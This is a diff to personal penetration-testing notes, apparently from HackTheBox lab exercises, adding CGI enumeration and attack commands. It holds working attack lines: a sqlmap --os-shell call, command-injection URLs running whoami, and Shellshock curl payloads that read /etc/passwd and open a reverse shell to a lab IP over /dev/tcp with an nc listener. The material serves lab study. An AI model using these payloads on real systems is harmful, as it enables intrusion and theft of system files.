@@ -1963,12 +1963,17 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 --> fuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
 --> sword0x00@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+--> gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 --> try command injection
 	- http://10.129.204.227:8080/cgi/welcome.bat?&dir
 	- http://10.129.204.227:8080/cgi/welcome.bat?&set
 	- http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
 	-http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 
+--> curl -i http://10.129.204.231/cgi-bin/access.cgi
+	- curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
+	- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.38/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
+	- sudo nc -lvnp 7777
 ```
 ## Useful Resources
 
